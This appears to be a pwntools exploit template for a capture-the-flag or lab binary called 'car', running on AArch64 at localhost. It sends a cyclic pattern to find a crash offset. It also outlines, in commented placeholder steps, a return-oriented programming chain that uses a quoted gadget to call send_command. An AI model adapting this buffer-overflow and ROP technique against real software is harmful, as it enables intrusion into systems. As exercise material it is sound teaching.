from pwn import *

binary = './car'
HOST   = '127.0.0.1'
PORT   = 1337

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        log.info('Did not specify GDB or REMOTE. Exiting')
        exit()

'''
0x400d4c  e007c1a8   ldp     x0, x1, [sp], #0x10 {arg1} {arg2}
0x400d50  fd7bc1a8   ldp     x29, x30, [sp], #0x10 {arg3} {arg_18}
0x400d54  c0035fd6   ret     

cmd = next(e.search(b'u\0')) # move (u)p
cmd = next(e.search(b'd\0')) # move (d)own
cmd = next(e.search(b'l\0')) # move (l)eft
cmd = next(e.search(b'r\0')) # move (r)ight
'''


p = start()
payload = cyclic(1337)

#payload = cyclic(???)    # Step 1: ??? = bytes until program crashes
#payload += p64(gadget)   # Step 2: call gadget with stack setup
#payload += cyclic(???)   # padding for x0 
#payload += p64(cmd)      # addr of command character (e.g. - '(l)eft')
#payload += cyclic(???)   # padding for x30                       
#payload += p64(????)     # addr of send_command

p.sendline(payload)       # Step 3: Profit


p.interactive()
